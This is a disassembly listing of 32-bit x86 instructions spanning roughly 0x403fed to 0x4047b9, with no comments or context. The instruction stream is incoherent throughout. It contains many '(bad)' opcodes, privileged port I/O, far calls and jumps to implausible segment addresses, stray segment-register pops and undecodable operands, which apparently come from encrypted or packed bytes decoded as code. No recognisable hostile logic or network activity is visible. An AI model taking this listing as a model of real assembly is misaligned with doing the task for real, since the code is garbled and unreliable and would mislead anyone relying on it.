  403fed:	ins    BYTE PTR es:[edi],dx
  403fee:	mov    edi,0xc6c7304d
  403ff3:	push   ds
  403ff4:	mov    edx,0xe789ff55
  403ff9:	xlat   BYTE PTR ds:[ebx]
  403ffa:	and    eax,0x429e9505
  403fff:	pop    ss
  404000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404001:	sub    eax,0x6cd47cc2
  404006:	out    dx,eax
  404007:	std    
  404008:	fadd   st(3),st
  40400a:	ins    BYTE PTR es:[edi],dx
  40400b:	test   eax,0xc671d669
  404010:	fbstp  TBYTE PTR [ecx-0x7]
  404013:	das    
  404014:	pop    ebx
  404015:	mov    ch,0x1f
  404017:	mov    ebp,0xdb623de
  40401c:	cmp    DWORD PTR ds:0xb64cc91,ebx
  404022:	cli    
  404023:	mov    esp,0x5153e119
  404028:	jb     0x40404e
  40402a:	xchg   edx,eax
  40402b:	popa   
  40402c:	or     esp,DWORD PTR [ebx-0x1a]
  40402f:	mov    ss,WORD PTR [eax-0x78]
  404032:	push   edi
  404033:	pop    ds
  404034:	repnz xor DWORD PTR [ecx],ebx
  404037:	lds    esi,FWORD PTR [esi+ebx*4]
  40403a:	rcr    BYTE PTR [edx+edi*4],cl
  40403d:	fsub   DWORD PTR [ecx]
  40403f:	loope  0x403fef
  404041:	mov    esi,0x5de927b9
  404046:	icebp  
  404047:	push   eax
  404048:	mov    esp,0x74fba552
  40404d:	fmul   DWORD PTR [esp+ebp*2-0x36]
  404051:	mov    edi,0xd847c37e
  404056:	mov    esi,0x1d9618ef
  40405b:	push   ecx
  40405c:	sbb    BYTE PTR [ebp-0x60505fcc],ah
  404062:	loope  0x40406c
  404064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404065:	xchg   ebp,eax
  404066:	retf   
  404067:	add    DWORD PTR [edx+0xd21fde6],edi
  40406d:	jmp    0x7bc4:0xc3e69077
  404074:	(bad)  
  404075:	int3   
  404076:	inc    ebx
  404077:	fmul   st,st(4)
  404079:	pop    esi
  40407a:	jle    0x4040eb
  40407c:	std    
  40407d:	ret    
  40407e:	cmp    DWORD PTR [ecx-0x1e],0xff0d8ec0
  404085:	pop    eax
  404086:	or     ah,BYTE PTR [esi+0x7a]
  404089:	call   0xa242:0x64612586
  404090:	fxch   st(1)
  404092:	mov    edi,0x678f397b
  404097:	in     eax,dx
  404098:	push   edx
  404099:	pop    ecx
  40409a:	outs   dx,DWORD PTR ds:[esi]
  40409b:	push   ss
  40409c:	add    ecx,DWORD PTR [eax]
  40409e:	iret   
  40409f:	shl    BYTE PTR [esi],0x15
  4040a2:	add    BYTE PTR [eax+0xf7f5b6d],ch
  4040a8:	add    edx,DWORD PTR [eax-0x4dac657c]
  4040ae:	mov    WORD PTR cs:[ebx-0x57],es
  4040b2:	(bad)  
  4040b3:	xchg   esp,eax
  4040b4:	xchg   ebx,eax
  4040b5:	mov    ebx,0xaf1b9f3f
  4040ba:	fstp   QWORD PTR [edx]
  4040bc:	fwait
  4040bd:	xlat   BYTE PTR ds:[ebx]
  4040be:	repnz push 0xa6b7daf1
  4040c4:	ins    DWORD PTR es:[edi],dx
  4040c5:	xor    eax,DWORD PTR [ebx]
  4040c7:	jmp    0x64fb9b0a
  4040cc:	rol    BYTE PTR ds:0xfd02d500,cl
  4040d2:	enter  0x84c1,0x98
  4040d6:	adc    ecx,DWORD PTR [ebp+0x32]
  4040d9:	adc    esp,DWORD PTR [eax+0x52]
  4040dc:	mov    bl,0x38
  4040de:	icebp  
  4040df:	cdq    
  4040e0:	adc    ebp,eax
  4040e2:	dec    esp
  4040e3:	in     eax,0xa6
  4040e5:	iret   
  4040e6:	xchg   ebp,eax
  4040e7:	add    ah,BYTE PTR [ebx*1+0x5feff97e]
  4040ee:	push   0x976d7c61
  4040f3:	adc    DWORD PTR ds:0xaf4a2f77,edx
  4040f9:	or     eax,0x8a84d2c
  4040fe:	or     al,0x84
  404100:	inc    esp
  404101:	mov    cl,bh
  404103:	push   ss
  404104:	test   DWORD PTR [edi],esi
  404106:	mov    ecx,0x9dd2f725
  40410b:	sbb    cl,al
  40410d:	cs sbb esp,esi
  404110:	push   0x559982f
  404115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404116:	pop    es
  404117:	jle    0x40418a
  404119:	cli    
  40411a:	fnstcw WORD PTR [eax+0x43]
  40411d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40411e:	cmp    dh,ah
  404120:	pop    edx
  404121:	or     ch,0x3d
  404124:	xor    al,0x2c
  404126:	sub    BYTE PTR [esi],dh
  404128:	fnstenv [ecx+0x208bc84a]
  40412e:	jg     0x4040d4
  404130:	leave  
  404131:	cmp    DWORD PTR [ebx],edi
  404133:	int    0x43
  404135:	inc    esi
  404136:	sub    DWORD PTR [ebx-0x4b],edx
  404139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40413a:	xchg   edi,eax
  40413b:	xchg   esi,eax
  40413c:	inc    eax
  40413d:	shr    DWORD PTR ds:0x2618f008,0x5a
  404144:	cmc    
  404145:	dec    ebp
  404146:	or     dl,dl
  404148:	mov    dh,0x39
  40414a:	pop    ebx
  40414b:	ja     0x40413e
  40414d:	bound  eax,QWORD PTR [edi-0x5e]
  404150:	ja     0x40414a
  404152:	sbb    ch,BYTE PTR [edi-0x51a8eb17]
  404158:	inc    edx
  404159:	call   0x1ce4:0xee1c8bac
  404160:	(bad)  
  404161:	xchg   esi,eax
  404162:	lahf   
  404163:	in     eax,dx
  404164:	call   0x10f93391
  404169:	not    DWORD PTR ds:0xe7affd45
  40416f:	xchg   ecx,eax
  404170:	push   0x1f
  404172:	inc    esp
  404173:	inc    esi
  404174:	fidiv  WORD PTR [ebx-0x23fda41f]
  40417a:	or     eax,0x53141bd9
  40417f:	sar    BYTE PTR [esi+0x79],1
  404182:	sub    DWORD PTR [esi-0x3c4d7b82],esp
  404188:	xor    esp,DWORD PTR [esi]
  40418a:	push   ds
  40418b:	pushf  
  40418c:	push   0xffffffc0
  40418e:	shr    BYTE PTR [edi-0x5608e54b],0x5f
  404195:	jg     0x40417c
  404197:	pop    esp
  404198:	(bad)
  40419b:	mov    al,ds:0x419d7e80
  4041a0:	pop    eax
  4041a1:	mov    ebp,0xdfb44e8a
  4041a6:	and    bh,BYTE PTR [ecx]
  4041a8:	int3   
  4041a9:	push   ecx
  4041aa:	xchg   ebp,eax
  4041ac:	and    al,0xec
  4041ae:	fidiv  DWORD PTR [edi+0x57]
  4041b1:	stc    
  4041b2:	jns    0x404175
  4041b4:	mov    al,ds:0x29638dfc
  4041b9:	imul   esp,DWORD PTR [edx-0x1db18264],0x999e9875
  4041c3:	idiv   BYTE PTR [ecx-0x5b403e4]
  4041c9:	(bad)  
  4041ca:	pushf  
  4041cb:	jno    0x40423d
  4041cd:	pop    edx
  4041ce:	fsub   DWORD PTR [ecx-0x59]
  4041d1:	and    BYTE PTR [bx+0x51e5],al
  4041d6:	add    bl,bl
  4041d8:	mov    eax,ds:0x1360316e
  4041dd:	call   0x9604:0xf2332cfd
  4041e4:	in     eax,dx
  4041e5:	or     ch,BYTE PTR [ebx+0x71]
  4041e8:	retf   0x92fd
  4041eb:	nop
  4041ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041ed:	jmp    0x10aa:0xc3ef3c37
  4041f4:	inc    ecx
  4041f5:	pop    esi
  4041f6:	jg     0x404190
  4041f8:	xchg   edi,eax
  4041f9:	ins    DWORD PTR es:[edi],dx
  4041fa:	rcr    DWORD PTR [ebx+eiz*2],0x99
  4041fe:	and    edx,esp
  404200:	sub    al,0x2f
  404202:	or     ah,ah
  404204:	xchg   ecx,eax
  404205:	adc    eax,DWORD PTR [edx+0x22]
  404208:	cmp    ah,dh
  40420a:	pop    edx
  40420b:	lock xchg DWORD PTR [edx],esi
  40420e:	fdiv   st(0),st
  404210:	pop    ebp
  404211:	aam    0x63
  404213:	inc    ebx
  404214:	push   edx
  404215:	xchg   BYTE PTR [ecx+0x31],al
  404218:	icebp  
  404219:	aam    0xf5
  40421b:	aaa    
  40421c:	mov    ch,0x8e
  40421e:	inc    edx
  40421f:	sbb    al,BYTE PTR [edi-0xe99f08]
  404225:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404226:	mov    eax,ds:0x255d318e
  40422b:	adc    eax,0xad465e99
  404230:	add    ah,cl
  404232:	push   ss
  404233:	cmp    BYTE PTR [edi-0x69],dl
  404236:	xlat   BYTE PTR ds:[ebx]
  404237:	push   esi
  404238:	fcom   QWORD PTR [ecx-0x38c044c1]
  40423e:	ds pop eax
  404240:	call   0x61b3:0x8d86879d
  404247:	loopne 0x4041ce
  404249:	test   al,0xa6
  40424b:	in     eax,dx
  40424c:	inc    esp
  40424d:	mov    bl,0x8
  40424f:	push   edx
  404250:	not    ch
  404252:	push   cs
  404253:	sbb    DWORD PTR [esi-0x163032d9],0x74deef59
  40425d:	mov    al,0x79
  40425f:	pop    ds
  404260:	mov    eax,DWORD PTR [edx-0x7267e9ca]
  404266:	lea    ebx,[edi+0x46]
  404269:	sub    DWORD PTR [eax+esi*8+0x9],ebx
  40426d:	mov    ah,0xd9
  40426f:	loope  0x4042d5
  404271:	(bad)  
  404272:	mov    ah,0x48
  404274:	ror    esp,cl
  404276:	jno    0x40425d
  404278:	mov    ebp,0x6006ea90
  40427d:	pop    ebx
  40427e:	mov    eax,ds:0xffd126a4
  404283:	dec    eax
  404284:	dec    esp
  404285:	push   ecx
  404286:	pop    es
  404287:	sub    DWORD PTR [edi],edx
  404289:	sub    al,0xf5
  40428b:	cmp    ecx,DWORD PTR [esi]
  40428d:	sub    BYTE PTR [ebx],dh
  40428f:	mov    ds:0xbd88bc01,eax
  404294:	and    edx,DWORD PTR [edi]
  404296:	and    edx,DWORD PTR ds:0x3ec58f03
  40429c:	jecxz  0x4042a1
  40429e:	nop
  40429f:	retf   0xe50b
  4042a2:	ins    BYTE PTR es:[edi],dx
  4042a3:	loopne 0x404321
  4042a5:	pop    edx
  4042a6:	std    
  4042a7:	add    BYTE PTR [esi+0x150df305],bl
  4042ad:	jle    0x4042e8
  4042af:	inc    ebx
  4042b0:	xchg   ebx,eax
  4042b1:	lahf   
  4042b2:	push   ss
  4042b3:	push   eax
  4042b4:	adc    al,0x3f
  4042b6:	or     edx,DWORD PTR [eax+0x14]
  4042b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042ba:	jl     0x404309
  4042bc:	mov    edx,0xe1614ac0
  4042c1:	sbb    esp,DWORD PTR [ebp-0x7a58f73]
  4042c7:	popf   
  4042c8:	daa    
  4042c9:	xchg   ecx,eax
  4042ca:	popa   
  4042cb:	not    BYTE PTR [ecx+edx*4]
  4042ce:	loopne 0x404289
  4042d0:	mov    BYTE PTR [esi+0x43],al
  4042d3:	popa   
  4042d4:	ret    0xe93b
  4042d7:	outs   dx,DWORD PTR ds:[esi]
  4042d8:	dec    ecx
  4042d9:	push   0x56
  4042db:	adc    eax,0x32d13709
  4042e0:	dec    eax
  4042e1:	pop    esp
  4042e2:	and    ah,BYTE PTR [eax]
  4042e4:	pop    ebx
  4042e5:	mul    dh
  4042e7:	loopne 0x404315
  4042e9:	pop    es
  4042ea:	gs push es
  4042ec:	jle    0x404328
  4042ee:	cmp    al,0xe1
  4042f0:	out    dx,eax
  4042f1:	jle    0x4042ee
  4042f3:	jns    0x4042d2
  4042f5:	(bad)  
  4042f6:	pushf  
  4042f7:	pop    ss
  4042f8:	jl     0x404329
  4042fa:	aas    
  4042fb:	fs aaa 
  4042fd:	mov    ebp,0x6edd4826
  404302:	dec    esi
  404303:	lea    esi,[ebp-0x41]
  404306:	jl     0x404371
  404308:	and    cl,BYTE PTR [edi]
  40430a:	fadd   st(5),st
  40430c:	call   0xa90703e9
  404311:	jmp    0x89bf:0x9d5006a
  404318:	aas    
  404319:	push   ebx
  40431a:	and    al,0x72
  40431c:	pushf  
  40431d:	(bad)  
  40431f:	leave  
  404320:	pushf  
  404321:	das    
  404322:	sub    bh,BYTE PTR [edi]
  404324:	inc    eax
  404325:	pop    esp
  404326:	ss scas al,BYTE PTR es:[edi]
  404328:	adc    eax,DWORD PTR ds:0x70a58fe8
  40432e:	repz xchg ah,al
  404331:	repz jnp 0x404323
  404334:	jno    0x404345
  404336:	mov    esi,ss
  404338:	lods   eax,DWORD PTR ds:[esi]
  404339:	xchg   ebx,eax
  40433a:	imul   ebx,ebx,0x5689d0ab
  404340:	fstp   TBYTE PTR [edx+0x45fd1b1e]
  404346:	xchg   ebp,eax
  404347:	dec    esp
  404348:	ss jecxz 0x404328
  40434b:	fs or  esi,esi
  40434e:	pop    ebp
  40434f:	jmp    0xb3b29468
  404354:	fld    DWORD PTR [eax-0x6e]
  404357:	mov    cl,0x52
  404359:	pop    eax
  40435a:	imul   ebp,DWORD PTR [ebx],0xffffff90
  40435d:	jo     0x4043a3
  40435f:	fcomp  DWORD PTR [ebx+0x39f5fd3d]
  404365:	js     0x40439f
  404367:	dec    esi
  404368:	inc    edx
  404369:	xor    al,0x1d
  40436b:	jbe    0x4042f7
  40436d:	mov    ebx,0xac1fb019
  404372:	mov    edx,0x43957ff1
  404377:	nop
  404378:	xchg   edx,edx
  40437a:	and    bh,ch
  40437c:	je     0x4042fe
  40437e:	inc    ebp
  40437f:	push   eax
  404380:	and    eax,0x9339abde
  404385:	loope  0x4043d4
  404387:	js     0x404353
  404389:	xchg   BYTE PTR [ecx+0x6b9bec7a],cl
  40438f:	div    DWORD PTR [edi]
  404391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404392:	imul   ecx,DWORD PTR [eax+0x43],0xbc069373
  404399:	iret   
  40439a:	mov    BYTE PTR [ebp+0x5581f5f2],ch
  4043a0:	jp     0x4043f5
  4043a2:	rcr    DWORD PTR [ebx-0x7a33c9e7],cl
  4043a8:	pop    es
  4043a9:	mov    esi,0xeba0c5da
  4043ae:	or     eax,0x6fcef881
  4043b3:	addr16 (bad) 
  4043b5:	cmc    
  4043b6:	cs mov edx,0x5d8e7699
  4043bc:	pushf  
  4043bd:	adc    DWORD PTR [edi+edi*1],ebx
  4043c0:	push   esp
  4043c1:	push   edx
  4043c2:	repz inc edx
  4043c4:	adc    al,0x7
  4043c6:	or     dh,dl
  4043c8:	inc    edx
  4043c9:	xor    ah,BYTE PTR [edi-0x42814301]
  4043cf:	xor    DWORD PTR [edi],0x497f1e3e
  4043d5:	es jmp 0x404421
  4043d8:	enter  0x90d8,0x7f
  4043dc:	jnp    0x404388
  4043de:	xor    eax,DWORD PTR [esi-0x7e]
  4043e1:	mov    bl,0xde
  4043e3:	push   ebx
  4043e4:	call   0x311e:0x584c01a8
  4043eb:	hlt    
  4043ec:	sbb    eax,0xa7141eeb
  4043f1:	arpl   sp,di
  4043f3:	aas    
  4043f4:	loopne 0x404377
  4043f6:	push   ebp
  4043f7:	sbb    al,0xf4
  4043f9:	mov    ds:0xa518b8af,eax
  4043fe:	rcr    DWORD PTR [edx+edx*8+0x9cfc509],1
  404405:	xchg   esp,eax
  404406:	add    eax,DWORD PTR [edx-0x5c]
  404409:	jle    0x4043a8
  40440b:	mov    ebp,0x2ee4e8f6
  404410:	lods   eax,DWORD PTR ds:[esi]
  404411:	and    dl,BYTE PTR [ebx-0x6e]
  404414:	popa   
  404415:	dec    edx
  404416:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404417:	in     eax,dx
  404418:	jg     0x4043a6
  40441a:	xlat   BYTE PTR ds:[ebx]
  40441b:	xchg   edi,eax
  40441c:	mov    ebp,0x2da3ec4a
  404421:	fcmovbe st,st(0)
  404423:	or     dl,BYTE PTR [ebx]
  404425:	dec    ebp
  404426:	or     eax,0xa7021ed3
  40442b:	sbb    dh,cl
  40442d:	jne    0x4043f1
  40442f:	fs and al,0xdb
  404432:	fdiv   st,st(0)
  404434:	pop    DWORD PTR [ebx+0x59]
  404437:	xchg   esi,eax
  404438:	stos   BYTE PTR es:[edi],al
  404439:	jecxz  0x404438
  40443b:	aaa    
  40443c:	push   esi
  40443d:	inc    esi
  40443e:	and    DWORD PTR [ecx],eax
  404440:	ret    0x9e51
  404443:	inc    esi
  404444:	dec    edx
  404445:	adc    DWORD PTR [ebx-0x19],0xffffffd0
  404449:	addr16 aas 
  40444b:	dec    esp
  40444c:	jo     0x404459
  40444e:	adc    eax,0x787b47a
  404453:	adc    eax,0x9bcdf8c8
  404458:	pushf  
  404459:	mov    ah,0xee
  40445b:	xchg   ebp,eax
  40445c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40445d:	pop    edi
  40445e:	mov    esp,0xf234f729
  404463:	dec    ecx
  404464:	cmp    edx,edi
  404466:	out    0x70,al
  404468:	xchg   ebx,esi
  40446a:	or     ebx,DWORD PTR [ebp-0xb]
  40446d:	sbb    al,0x5e
  40446f:	cmp    BYTE PTR [ebx-0x56],bh
  404472:	sbb    edi,ecx
  404474:	les    ebp,FWORD PTR [edi+0x7b4f7f55]
  40447a:	fcmove st,st(3)
  40447c:	inc    ecx
  40447d:	jl     0x40440e
  40447f:	dec    edi
  404480:	adc    al,0x66
  404482:	cld    
  404483:	stos   DWORD PTR es:[edi],eax
  404484:	jno    0x404429
  404486:	pop    ss
  404487:	xchg   edx,edx
  404489:	adc    al,0xdc
  40448b:	add    dh,BYTE PTR [edi-0x62d25801]
  404491:	daa    
  404492:	repz mov ds:0xc073fd87,eax
  404498:	sub    cl,ch
  40449a:	icebp  
  40449b:	test   eax,0x4974680b
  4044a0:	sub    eax,DWORD PTR ds:0x596ea899
  4044a6:	outs   dx,BYTE PTR ds:[esi]
  4044a7:	clc    
  4044a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044a9:	sbb    DWORD PTR [eax-0x6],edx
  4044ac:	xchg   edx,eax
  4044ad:	std    
  4044ae:	push   ecx
  4044af:	pop    ds
  4044b0:	das    
  4044b1:	sub    al,0x1f
  4044b3:	add    DWORD PTR [edi+0x4b],ecx
  4044b6:	cdq    
  4044b7:	fs jnp 0x4044b8
  4044ba:	mov    al,0x74
  4044bc:	pop    eax
  4044bd:	mov    ds:0xab0f0f2a,al
  4044c2:	xor    DWORD PTR [eax-0x285741d5],eax
  4044c8:	and    BYTE PTR [eax+0x47],cl
  4044cb:	sub    BYTE PTR [ecx+0x3f],dh
  4044ce:	aaa    
  4044cf:	or     esi,DWORD PTR [edx+0x4feb0b01]
  4044d5:	(bad)  
  4044d6:	out    dx,al
  4044d7:	call   0x22cf:0x5f8cdf13
  4044de:	dec    esi
  4044df:	call   0x60c771c3
  4044e4:	loope  0x404500
  4044e6:	add    dh,dh
  4044e8:	or     al,0xd9
  4044ea:	mov    dl,0x4c
  4044ec:	ja     0x4044e7
  4044ee:	outs   dx,BYTE PTR ds:[esi]
  4044ef:	push   es
  4044f0:	lahf   
  4044f1:	test   eax,0xa26e833b
  4044f6:	outs   dx,BYTE PTR ds:[esi]
  4044f7:	(bad)  [ebp+eax*2-0x32]
  4044fb:	add    dh,BYTE PTR [ebp+eiz*8-0x67]
  4044ff:	push   es
  404500:	adc    dh,BYTE PTR [eax]
  404502:	jne    0x404484
  404504:	mov    cl,0x4f
  404506:	push   edi
  404507:	das    
  404508:	or     ebp,DWORD PTR [ebx+0x537fcf5d]
  40450e:	lds    esp,FWORD PTR [esi+eax*4+0x2c]
  404512:	mov    eax,0xffaf9aa7
  404517:	push   ecx
  404518:	in     eax,0x76
  40451a:	enter  0xbcf7,0xa5
  40451e:	int    0xe6
  404520:	add    dh,BYTE PTR [edi-0x73]
  404523:	(bad)  [edx+0x6f5a916f]
  404529:	cmp    BYTE PTR [ebx],0x52
  40452c:	mov    dh,BYTE PTR [edx]
  40452e:	stos   DWORD PTR es:[edi],eax
  40452f:	cmc    
  404530:	clc    
  404531:	xchg   DWORD PTR [esi+0x78],ebx
  404534:	aad    0xde
  404536:	dec    esp
  404537:	xchg   esi,eax
  404538:	test   DWORD PTR [edx-0x16c2e71c],ebp
  40453e:	(bad)  
  40453f:	not    cl
  404541:	push   ds
  404542:	clc    
  404543:	pusha  
  404544:	adc    DWORD PTR [esi+0x5c4b1f4b],0xffffffe9
  40454b:	stos   BYTE PTR es:[edi],al
  40454c:	mov    esi,0x7c713065
  404551:	cmp    eax,DWORD PTR [esi+edx*4+0x5c]
  404555:	mov    eax,ds:0xcf0a8dd2
  40455a:	xchg   ecx,eax
  40455b:	jg     0x40458b
  40455d:	pop    esp
  40455e:	aad    0xbc
  404560:	sub    eax,0x552fc097
  404565:	sbb    al,0x55
  404567:	ins    DWORD PTR es:[edi],dx
  404568:	ss jl  0x404545
  40456b:	jne    0x40453e
  40456d:	xchg   edx,eax
  40456e:	js     0x40450e
  404570:	adc    dh,dl
  404572:	test   al,0x43
  404574:	(bad)  
  404575:	sbb    DWORD PTR [ebp+0x3f],ecx
  404578:	jg     0x404539
  40457a:	sbb    al,cl
  40457c:	outs   dx,DWORD PTR ds:[esi]
  40457d:	or     edi,DWORD PTR [edi]
  40457f:	mov    esp,0x1c5bc53d
  404584:	mov    bl,0x77
  404586:	int    0x7
  404588:	mov    esi,0xb1105314
  40458d:	fimul  WORD PTR [ecx+ebx*1]
  404590:	adc    ebp,DWORD PTR ds:0xeffc8bfb
  404596:	jg     0x4045d3
  404598:	es hlt 
  40459a:	pop    eax
  40459b:	xor    al,0xe1
  40459d:	out    0x7a,eax
  40459f:	scas   al,BYTE PTR es:[edi]
  4045a0:	cwde   
  4045a1:	inc    esp
  4045a2:	outs   dx,BYTE PTR ds:[esi]
  4045a3:	mov    dl,0xb4
  4045a5:	xor    al,0x56
  4045a7:	outs   dx,BYTE PTR ds:[esi]
  4045a8:	fs xchg ebx,eax
  4045aa:	les    eax,FWORD PTR [edi-0x39]
  4045ad:	loop   0x4045c3
  4045af:	xlat   BYTE PTR ds:[ebx]
  4045b0:	outs   dx,BYTE PTR ds:[esi]
  4045b1:	xor    BYTE PTR [ebp+ecx*1+0x55],al
  4045b5:	mov    esp,0x835c2557
  4045ba:	xchg   esp,eax
  4045bb:	push   es
  4045bc:	adc    al,0x5b
  4045be:	jg     0x40460b
  4045c0:	sbb    ch,BYTE PTR [ecx+0x47e6b8ef]
  4045c6:	and    al,0xda
  4045c8:	push   cs
  4045c9:	imul   DWORD PTR [ebx+0x3c]
  4045cc:	add    al,0x34
  4045ce:	xor    al,0x43
  4045d0:	adc    bh,bh
  4045d2:	xchg   ecx,eax
  4045d3:	push   0xcb61adc5
  4045d8:	inc    esi
  4045d9:	into   
  4045da:	adc    al,0xbc
  4045dc:	and    bh,ch
  4045de:	rep stos DWORD PTR es:[edi],eax
  4045e0:	(bad)  
  4045e1:	ins    DWORD PTR es:[edi],dx
  4045e2:	inc    edi
  4045e3:	test   BYTE PTR [ecx+0x38],al
  4045e6:	mov    cs,ebp
  4045e8:	xchg   ebx,eax
  4045e9:	in     al,0xf0
  4045eb:	fld    st(5)
  4045ed:	repnz imul ebx,ecx,0x47
  4045f1:	dec    edx
  4045f2:	mov    bl,0xe0
  4045f4:	and    ebp,edi
  4045f6:	imul   edx,edx,0xffffffba
  4045f9:	xor    al,ch
  4045fb:	sbb    BYTE PTR [edi],bh
  4045fd:	fs xchg ecx,eax
  4045ff:	loopne 0x4045bb
  404601:	test   ebp,esi
  404603:	aad    0xea
  404605:	or     DWORD PTR [edx+ebx*2],esi
  404608:	imul   esp,DWORD PTR [ecx],0xffffffd4
  40460b:	fidivr WORD PTR [eax+0x7f]
  40460e:	jb     0x404619
  404610:	idiv   BYTE PTR [edx-0x51]
  404613:	cld    
  404614:	or     BYTE PTR [esi-0x6e],0xb5
  404618:	dec    edi
  404619:	popf   
  40461a:	iret   
  40461b:	rcr    DWORD PTR [esi-0x6dc8c4eb],0xf3
  404622:	jno    0x404639
  404624:	sbb    al,0x1a
  404626:	cwde   
  404627:	mov    bh,0x3f
  404629:	imul   ecx,DWORD PTR [edx-0x40],0xa43ba848
  404630:	sub    ebx,esp
  404632:	je     0x404616
  404634:	dec    edi
  404635:	test   DWORD PTR [ecx+0x73],ebx
  404638:	dec    esi
  404639:	pop    ds
  40463a:	je     0x40469c
  40463c:	jmp    0x40461e
  40463e:	inc    edi
  40463f:	lds    eax,FWORD PTR [esi-0x3bec9aa3]
  404645:	addr16 test al,0x86
  404648:	shl    BYTE PTR [eax-0x7d],cl
  40464b:	cli    
  40464c:	daa    
  40464d:	ret    
  40464e:	mov    al,ds:0xcc04c762
  404653:	sbb    al,BYTE PTR [edi+0x2bca912c]
  404659:	mov    DWORD PTR [ebx+0x42],edx
  40465c:	test   eax,0xb03e585f
  404661:	pop    esi
  404662:	lahf   
  404663:	aas    
  404664:	pop    eax
  404665:	mov    cl,0x8b
  404667:	xchg   bh,al
  404669:	std    
  40466a:	lea    ebx,[eax+0x168b599e]
  404670:	mov    cl,0x47
  404672:	mov    dh,0x2
  404674:	ins    DWORD PTR es:[edi],dx
  404675:	mov    eax,ds:0xf4511d31
  40467a:	neg    BYTE PTR [ebx-0x7a]
  40467d:	pusha  
  40467e:	add    eax,0x960abcc6
  404683:	mov    ecx,eax
  404685:	aad    0x8
  404687:	cmp    bl,BYTE PTR [ecx-0x3d]
  40468a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40468b:	jg     0x4046fa
  40468d:	mov    dh,BYTE PTR fs:[edi-0x7e]
  404691:	sub    DWORD PTR [ebx],esp
  404693:	mov    WORD PTR [ebx],es
  404695:	sbb    eax,0x326d709f
  40469a:	cwde   
  40469b:	jp     0x4046ab
  40469d:	sub    eax,0xb48521e
  4046a2:	jb     0x404707
  4046a4:	inc    edi
  4046a5:	loope  0x404692
  4046a7:	inc    ebp
  4046a8:	adc    BYTE PTR [eax+0x36],cl
  4046ab:	dec    edi
  4046ac:	dec    esi
  4046ad:	test   DWORD PTR [eax-0x23374ca3],eax
  4046b3:	lods   eax,DWORD PTR ds:[esi]
  4046b4:	test   edx,eax
  4046b6:	lods   eax,DWORD PTR ds:[esi]
  4046b7:	mov    dh,0xf0
  4046b9:	pop    ss
  4046ba:	rcl    bl,1
  4046bc:	lds    esp,FWORD PTR [eax+eiz*4-0x23df255a]
  4046c3:	enter  0xae0d,0xe
  4046c7:	jl     0x404655
  4046c9:	sub    BYTE PTR [esi-0x2f],bh
  4046cc:	mov    DWORD PTR [edx-0x43],ecx
  4046cf:	inc    esp
  4046d0:	cmc    
  4046d1:	not    BYTE PTR [edx]
  4046d3:	push   esp
  4046d4:	cld    
  4046d5:	push   ebp
  4046d6:	pop    ss
  4046d7:	stos   DWORD PTR es:[edi],eax
  4046d8:	out    0x61,al
  4046da:	retf   0xf635
  4046dd:	or     eax,0xc4f8420a
  4046e2:	inc    esi
  4046e3:	fist   WORD PTR [esi+eiz*4-0x2ed26709]
  4046ea:	cmp    DWORD PTR [edi+ebx*8],eax
  4046ed:	sbb    ah,ch
  4046ef:	(bad)  
  4046f0:	jp     0x40471b
  4046f2:	or     al,0xc0
  4046f4:	sbb    eax,0xc8ed8d21
  4046f9:	xor    bh,BYTE PTR [edx-0x2788f488]
  4046ff:	sahf   
  404700:	fild   QWORD PTR [esp+edx*4]
  404703:	es ins DWORD PTR es:[edi],dx
  404705:	jmp    0x3fbc:0xa8dcd717
  40470c:	es cmpps xmm5,xmm0,0x30
  404711:	add    DWORD PTR [ebx-0x5c],0xe23db407
  404718:	jb     0x4046bf
  40471a:	mov    edi,eax
  40471c:	aad    0xad
  40471e:	pop    edi
  40471f:	inc    esp
  404720:	sub    al,0x7e
  404722:	scas   al,BYTE PTR es:[edi]
  404723:	add    BYTE PTR [esi-0x2ca12475],ch
  404729:	adc    BYTE PTR [ebx+ecx*4],dl
  40472c:	adc    al,0x89
  40472e:	leave  
  40472f:	push   ecx
  404730:	popf   
  404731:	repnz repz or DWORD PTR ds:0xcc4908d4,esp
  404739:	push   ebp
  40473a:	repz push ebp
  40473c:	pop    edi
  40473d:	sbb    eax,0x7f017755
  404742:	imul   DWORD PTR [esp+esi*4-0x2a]
  404746:	mov    eax,ds:0xd30c98ff
  40474b:	pop    esp
  40474c:	test   BYTE PTR [ebx-0x5e],dl
  40474f:	ret    
  404750:	ja     0x40470b
  404752:	or     eax,esp
  404754:	imul   esi,DWORD PTR [ebx+0x6402bc77],0x3a
  40475b:	ss (bad) 
  40475d:	push   esp
  40475e:	sub    dl,BYTE PTR [eax-0x2ee630ad]
  404764:	in     al,0xe1
  404766:	mov    al,ds:0xd9d83eac
  40476b:	repnz (bad) 
  40476d:	mov    ch,0x2
  40476f:	mov    esi,0xba3270aa
  404774:	rcl    DWORD PTR [edi],1
  404776:	mov    WORD PTR [esi+0x5e],?
  404779:	xchg   ebx,eax
  40477a:	fild   DWORD PTR [edx]
  40477c:	nop
  40477d:	add    al,0xd1
  40477f:	jge    0x404772
  404781:	fidivr WORD PTR ss:[ebx+eiz*8-0x18931277]
  404789:	push   ecx
  40478a:	ds aad 0x93
  40478d:	sbb    DWORD PTR [ebx],edi
  40478f:	jns    0x40475c
  404791:	xchg   ebp,eax
  404792:	push   ecx
  404793:	in     eax,0xa3
  404795:	arpl   WORD PTR [ebx],cx
  404797:	xchg   edi,eax
  404798:	dec    edx
  404799:	int3   
  40479a:	mov    WORD PTR [edi+0x168bf146],?
  4047a0:	jl     0x4047ea
  4047a2:	js     0x4047f7
  4047a4:	out    dx,al
  4047a5:	lock rcr bl,cl
  4047a8:	and    BYTE PTR [edi+0x11afce66],cl
  4047ae:	xlat   BYTE PTR ds:[ebx]
  4047af:	cmp    eax,0x31044819
  4047b4:	adc    DWORD PTR [edx+0x5b],eax
  4047b7:	test   al,0x11
  4047b9:	inc    ecx
